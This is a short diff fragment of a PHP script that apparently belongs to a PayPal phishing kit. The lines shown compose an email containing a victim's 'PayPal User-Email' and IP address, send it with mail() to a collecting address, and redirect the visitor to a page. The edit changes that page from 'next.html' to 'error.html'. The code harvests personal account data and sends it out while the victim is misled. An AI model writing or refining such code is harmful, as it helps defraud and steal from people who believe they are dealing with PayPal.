@@ -21,5 +21,5 @@ $email_body = "PayPal User-Email: $email.\n".
     
                                 "PayPal User-IP: $IP.\n";
     mail($to,$email_subject,$email_body);
-header('Location: next.html');
+header('Location: error.html');
 	?>
